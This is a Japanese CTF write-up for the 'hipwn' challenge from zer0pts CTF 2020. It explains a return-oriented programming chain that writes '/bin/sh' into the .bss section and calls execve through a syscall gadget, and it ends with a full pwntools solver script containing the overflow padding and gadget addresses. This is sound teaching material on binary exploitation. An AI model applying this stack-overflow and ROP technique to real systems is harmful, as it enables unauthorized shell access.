---
title: "hipwn - zer0pts CTF 2020"
date: 2022-05-03T11:51:30+09:00
tags: ["pwn", "zer0ptsCTF2020", "ptr-yudai's chall"]
draft: false
---

[hipwn - zer0ptsCTF2020(My solver)](https://github.com/yu1hpa/ctf-writeup/tree/master/2020/zer0ptsCTF/hipwn)

[hipwn - zer0ptsCTF2020(Official GitLab)](https://gitlab.com/zer0pts/zer0pts-ctf-2020/-/tree/master/hipwn)

# 方針
　`.bss` section に`/bin/sh`という文字列を置いて、
Return Oriented Programming(ROP)を組んで、
`execve("/bin/sh", 0, 0)`を実行する。

### ROP gadgetとは
　gadgetとは、`pop rdi; ret;`などの`ret;`で終わるコード片のことです。

今回、必要なgadgetは`rdi` `rsi` `rdx` `rax` `syscall` です。

|gadget |役割              |
|-------|------------------|
|rdi    |第1引数           |
|rsi    |第2引数           |
|rdx    |第3引数           |
|rcx    |第4引数           |
|r8     |第5引数           |
|:      |:                 |
|rax    |システムコール番号|
|syscall|システムコール    |

また、`execve`のシステムコール番号は`59`である。

### .bss section とは
　rw(read and write)が可能な初期値を持たない変数を格納するためのセクションである。
`.bss` sectionを使う理由は、rwできて便利だから。

通常の入力に`"/bin/sh"`を送って、バッファのアドレスを指定してもいいと思う。

### gadgetを探す旅🐈
　[`ropper`](https://github.com/sashs/Ropper)を使って、それぞれのgadgetを探します。

例)

```
$ ropper -f chall --search "pop rdi;"

0x000000000040141c: pop rdi; ret;
```

```python
rop_pop_rdi = 0x0040141c
rop_pop_rax = 0x00400121
rop_pop_rsi_r15 = 0x0040141a
rop_pop_rdx = 0x004023f5
rop_syscall = 0x004024dd
```

#### IUPAP命名法
　余談ですが、ROP gadgetを書くときは、
わかりやすいように[IUPAP命名法](https://ptr-yudai.hatenablog.com/entry/2021/12/03/205406)にしたがいます。

### gets(bss)に相当するROP
　ROPを組むときは、スタックのLIFOを思い出します。

```python
pld += p64(rop_pop_rdi)
pld += p64(elf.bss())
pld += p64(addr_gets)
```

[![gets_bss](https://i.gyazo.com/1bb40b1ccd7e9a3f869cb35882281125.png)](https://gyazo.com/1bb40b1ccd7e9a3f869cb35882281125)

ここで、.bss section に対して入力が開くので、`"/bin/sh"`を入力します。(参照：[solver](https://github.com/yu1hpa/ctf-writeup/tree/master/2020/zer0ptsCTF/hipwn))

### execve("/bin/sh", 0, 0)に相当するROP
　`gets(bss)`と同様にやります。

```python
pld += p64(rop_pop_rdi)
pld += p64(elf.bss())
pld += p64(rop_pop_rsi_r15)
pld += p64(0)
pld += p64(0)
pld += p64(rop_pop_rdx)
pld += p64(0)
pld += p64(rop_pop_rax)
pld += p64(59) # SYS_execve
pld += p64(rop_syscall)
```

# Solver
```python
from pwn import *

file = "./chall"
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = process(file)
elf = ELF(file)

rop_pop_rdi = 0x0040141c
rop_pop_rax = 0x00400121
rop_pop_rsi_r15 = 0x0040141a
rop_pop_rdx = 0x004023f5
rop_syscall = 0x004024dd
addr_gets = 0x004004ee

pld = b""
pld += b"A"*264
# get(bss)
pld += p64(rop_pop_rdi)
pld += p64(elf.bss())
pld += p64(addr_gets)
# execve(.bss, 0, 0)
pld += p64(rop_pop_rdi)
pld += p64(elf.bss()) #Line36 Input "/bin/sh"
pld += p64(rop_pop_rsi_r15)
pld += p64(0)
pld += p64(0)
pld += p64(rop_pop_rdx)
pld += p64(0)
pld += p64(rop_pop_rax)
pld += p64(59) # SYS_execve
pld += p64(rop_syscall)

io.sendlineafter("name?", pld)
io.sendline("/bin/sh\x00")

io.interactive()
```
